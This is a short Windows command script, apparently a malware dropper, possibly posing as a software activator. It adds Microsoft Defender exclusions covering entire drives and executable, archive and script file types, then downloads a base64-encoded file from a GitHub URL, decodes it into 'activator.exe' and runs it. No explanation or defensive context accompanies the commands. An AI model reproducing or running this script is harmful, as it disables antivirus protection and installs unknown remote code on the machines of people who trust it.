

powershell.exe Add-MpPreference -ExclusionPath C:\ProgramData\
powershell.exe Add-MpPreference -ExclusionPath C:\
powershell.exe Add-MpPreference -ExclusionPath D:\,K:\,F:\,E:\,J:\,K:\,Y:\,A:\,M:\,N:\
powershell.exe Add-MpPreference -ExclusionExtension .exe,.int,.rar,.zip,.dll,.cmd,.bat
timeout 5
cd C:\ProgramData
timeout 5
powershell wget "https://github.com/MASMob2022/pyw.download/raw/main/serialst.int" -outfile "serialst.int"
powershell $WebClient.DownloadFile("https://github.com/MASMob2022/pyw.download/raw/main/serialst.int","C:\ProgramData\serialst.int")
timeout 5
powershell -C "& {$outpath = (Join-Path (pwd) 'activator.exe'); $inpath = (Join-Path (pwd) 'serialst.int'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"
activator.exe